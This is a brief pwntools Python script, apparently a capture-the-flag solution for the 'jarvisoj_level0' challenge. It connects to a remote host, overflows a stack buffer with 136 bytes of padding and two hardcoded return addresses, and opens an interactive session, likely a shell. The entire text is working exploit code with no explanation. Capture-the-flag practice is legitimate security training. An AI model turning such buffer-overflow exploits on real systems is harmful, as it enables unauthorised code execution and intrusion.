from pwn import*
#io=process('./jarvisoj_level0')
io=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
padding=b'a'*136+p64(0x0000000000400431)+p64(0x00400596)
io.sendline(padding)
io.interactive()